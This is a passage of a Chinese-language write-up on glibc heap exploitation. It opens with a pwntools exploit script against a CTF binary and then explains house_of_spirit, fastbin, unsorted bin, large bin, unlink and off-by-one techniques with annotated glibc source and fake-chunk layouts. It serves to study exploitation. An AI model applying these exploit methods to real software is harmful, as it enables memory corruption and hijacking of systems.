+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, index)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"3. Free"</span>, <span class="string">"1"</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">":"</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">":"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">"3. Free"</span>, <span class="string">"3"</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">":"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"3. Free"</span>, <span class="string">"2"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">":"</span>, str(index))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./new_chall"</span>, env=&#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc-2.24.so"</span>&#125;)</span><br><span class="line">r.sendlineafter(<span class="string">":"</span>, <span class="string">"a"</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="number">0</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x68</span> + p64(<span class="number">0x61</span>))</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">24</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">15</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">16</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">17</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">18</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"\x20"</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"\xcd\x4a"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(15)</span></span><br><span class="line"><span class="comment"># edit(15, p64(0x00))</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"a"</span> * <span class="number">8</span> + <span class="string">"\xe0\x4a"</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">0x13</span> + <span class="string">"\x4f\x39\x5b"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">7</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	resp = r.recv(<span class="number">4</span>, timeout=<span class="number">6</span>)</span><br><span class="line">	r.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	r.close()</span><br></pre></td></tr></table></figure>
+<h3 id="house_of_spirit">house_of_spirit</h3>
+<p>覆盖一个堆指针变量,使其指向足够可控的区域,<code>free</code>后系统会错误的将该区域作为堆块放到相应的<code>bin</code>里面,再分配出来.</p>
+<p>关键在于伪造两个<code>fast bin chunk</code>.然后覆盖一个堆指针变量使其指向第一个<code>fast bin chunk</code>,<code>free</code>后再<code>malloc</code>使两个<code>fast bin chunk</code>间的区域可控.</p>
+<p><code>free</code>时的检测.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p)) &#123;</span><br><span class="line"><span class="comment">/* 如果当前free的chunk是通过mmap()分配的,调用munmap_chunk()函数munmap本chunk */</span></span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* mmap标志位检测 */</span></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line"><span class="comment">/* in_use标志位检测 */</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"><span class="comment">/* 伪造堆块的size字段不能超过fastbin的最大值 */</span></span><br><span class="line">__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* 这个是不能成立的,所以下一个堆块的大小要大于2 * SIZE_ZE小于system_mem */</span></span><br></pre></td></tr></table></figure>
+<h3 id="house_of_spirit-with-tcache">house_of_spirit with tcache</h3>
+<p><code>glibc_2.26</code>启用了<code>tcache</code>机制.<code>tcache</code>不检查<code>next chunk</code>的<code>size</code>位所以省去了<code>bypass</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">unsigned</span>  <span class="keyword">long</span>  <span class="keyword">long</span> * a; <span class="comment">//被覆盖的指针</span></span><br><span class="line"><span class="keyword">unsigned</span>  <span class="keyword">long</span>  <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake_chunk</span></span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;                   <span class="comment">//fake_size</span></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];                     <span class="comment">//覆盖</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure>
+<h2 id="各种bin_attack">各种bin_attack</h2>
+<h3 id="fastbin_attack">fastbin_attack</h3>
+<p>劫持<code>fastbin</code>的<code>fd</code>即可,需要绕过<code>size</code>检测.</p>
+<h3 id="unsorted_bin_attack">unsorted_bin_attack</h3>
+<p>劫持<code>unsorted_bin_chunk</code>的<code>bk</code>任意地址写一个<code>libc</code>地址.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* code */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);<span class="comment">//*(fake_bk + 0x10) = unsorted_chunks (av)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">	set_inuse_bit_at_offset (victim, size);</span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line">  check_malloced_chunk (av, victim, nb);</span><br><span class="line">  <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意<code>unsorted_bin_attack</code>的时候需要把<code>unsorted_bin</code>中剩下的<code>chunk</code>一下申请完,否则会报错.之后<code>unsorted bin</code>链表就无法使用了.</p>
+<h3 id="large_bin_attack">large_bin_attack</h3>
+<p>首先分配<code>chunk p1</code>,<code>p2</code>和<code>p3</code>(<code>2</code>,<code>3</code>一样大),并且在它们之间插入其他的<code>chunk</code>以防止在释放时被合并.</p>
+<p>依次释放掉<code>p1</code>和<code>p2</code>,这两个<code>chunk</code>将被放入<code>unsorted bin</code>.</p>
+<p>接下来随便<code>malloc</code>一个<code>chunk</code>使<code>p1</code>被切分为两块(小于<code>p1</code>即可),同时<code>p2</code>回到对应的<code>large bin</code>链表中.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size)) &#123;</span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 当前chunk属于large bins同理插入,不过large bin中的空闲chunk是按照从大到小排序的,需要找对插入位置 */</span></span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">    <span class="comment">/* fwd不等于bck意味着该large bin中有空闲chunk存在 */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* 将当前chunk的size的inuse标志bit置位,相当于加1,便于加快chunk大小的比较 */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="comment">/* 断言在large bin双向循环链表中的最后一个chunk的size字段中的非主分配区的标志bit没有置位 */</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">            <span class="comment">/* 当前chunk比large bin的最后一个chunk的大小还小,那么当前chunk就插入到large bin的链表的最后. */</span></span><br><span class="line">            <span class="comment">/* 存在两个双向循环链表,一个包含了large bin中所有的chunk,另一个为chunk size链表,该链表从每个相同大小的chunk的取出第一个chunk按照大小顺序链接在一起 */</span></span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">            <span class="comment">/* 正向遍历chunk size链表,直到找到第一个大小小于等于当前chunk大小的chunk */</span></span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">            <span class="comment">/* 则同一大小的chunk已经存在,为了不修改chunk size链表,当前chunk插入fwd之后 */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* 当前chunk的大小大于fwd的大小,则将当前chunk作为该chunk size的代表加入chunk size链表,chunk size链表也是按照由大到小的顺序排序 */</span></span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* 如果large bin链表中没有chunk,直接将当前chunk加入chunk size链表 */</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="comment">/* 上面的代码将当前chunk插入到large bin的空闲chunk链表中,并将large bin所对应binmap的相应bit置位 */</span></span><br></pre></td></tr></table></figure>
+<p>这时对<code>large bin</code>里的<code>chunk p2</code>进行修改.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/8gx p2-2</span><br><span class="line">0x555555757130:    0x0000000000000000    0x00000000000003f1  &lt;-- fake_size:小于原大小</span><br><span class="line">0x555555757140:    0x0000000000000000    0x00007fffffffde60  &lt;-- fake_bk:</span><br><span class="line">0x555555757150:    0x0000000000000000    0x00007fffffffde58  &lt;-- fake_bk_nextsize</span><br><span class="line">0x555555757160:    0x0000000000000000    0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>最后释放<code>p3</code>,将其放入<code>unsorted bin</code>,紧接着进行<code>malloc</code>之前<code>p1</code>切分剩下的<code>chunk</code>,将<code>p3</code>整理回<code>large bin</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">            <span class="comment">/* code */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">            <span class="comment">/* code */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//此时fwd = p2,victim = p3.</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd;                     <span class="comment">//p3-&gt;fd_nextsize = p2</span></span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;        <span class="comment">//p3-&gt;bk_nextsize = p2-&gt;fake_bk_nextsize</span></span><br><span class="line">            fwd-&gt;bk_nextsize = victim;                     <span class="comment">//p2-&gt;bk_nextsize = p2</span></span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;     <span class="comment">//p2-&gt;fake_bk_nextsize-&gt;fd_nextsize = p3</span></span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;                                     <span class="comment">//bck = p2-&gt;fake_bk</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;                                          <span class="comment">//p2-&gt;fake_bk-&gt;fd = p3</span></span><br></pre></td></tr></table></figure>
+<p>所以实际修改地址为:<code>fake_bk_nextsize + 0x20</code>,<code>fake_bk + 0x10</code>.</p>
+<h2 id="others">others</h2>
+<h3 id="unlink">unlink</h3>
+<p><code>free</code>函数在释放堆块时,会判断相邻前,后堆块是否为空闲堆块,是就会进行合并,然后利用<code>unlink</code>机制将该空闲堆块从<code>unsorted bin</code>中取下.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"><span class="comment">/* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */</span></span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line"><span class="comment">/* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    <span class="comment">/* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */</span></span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以让一个构造出来的<code>fake chunk</code>被<code>unlink</code>导致一次固定地址写.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                   \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		                \</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;								              \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		                                     \</span><br><span class="line">	        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	            malloc_printerr (check_action, <span class="string">"corrupted double-linked list (not small)"</span>, P, AV);					                 \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				              \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				              \</span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							                      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                &#125;							                          \</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;							                      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		  \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		  \</span><br><span class="line">            &#125;								                          \</span><br><span class="line">        &#125;								                              \</span><br><span class="line">    &#125;									                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要绕过检测<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code>,使<code>P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code>为真.</p>
+<p>如果程序存在堆溢出漏洞,可以在当前<code>chunk</code>伪造一个小<code>0x10</code>的<code>fake chunk</code>,同时将下一<code>chunk</code>头部的<code>pre_size</code>和<code>size</code>修改,<code>free</code>下一<code>chunk</code>触发<code>unlink</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pre_size1 | size1 | fake_pre_size = pre_size1 ? pre_size1 + 0x10 : 0 | fake_size = size1 - 0x10 | &amp;target - 0x18 | &amp;target - 0x10 | padding | fake_size align | size2 &amp; ~1</span><br></pre></td></tr></table></figure>
+<p>要求<code>target = P</code>.结果<code>target = &amp;target - 0x18</code>.</p>
+<h3 id="off_by_one">off_by_one</h3>
+<p>能溢出下一个堆块第一个字节.</p>
+<p><code>malloc</code>合适大小的三个<code>chunk</code>,首先<code>free</code>掉<code>chunk2</code>(<code>chunk2</code>的大小需大于<code>global_max_fast</code>,使其进入<code>unsorted bin</code>).通过溢出<code>chunk1</code>修改<code>chunk2</code>的<code>size</code>域(变小),此时<code>chunk2</code>的大小变为<code>fake_size</code>(因为其处于<code>unsorted bin</code>).</p>
+<p>这里要求<code>chunk1</code>大小为膜<code>16</code>余<code>8</code>,<code>32</code>位膜<code>8</code>余<code>4</code>.同时为了绕过检测需要在<code>free</code>前在<code>chunk2</code>的内部伪造一个<code>prev_size</code>.</p>
+<p><code>malloc</code>两个新的<code>chunk</code>使其充满<code>chunk2</code>的<code>fake_size</code>大小.先后<code>free</code>掉<code>chunk21</code>和<code>chunk3</code>.<code>chunk21</code>就会被当作<code>chunk2</code>与<code>chunk3</code>合并.再次<code>malloc</code>一个<code>chunk2</code>与<code>chunk3</code>合并大小的<code>chunk4</code>.此时<code>chunk4</code>与<code>chunk22</code>内存区域重叠.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 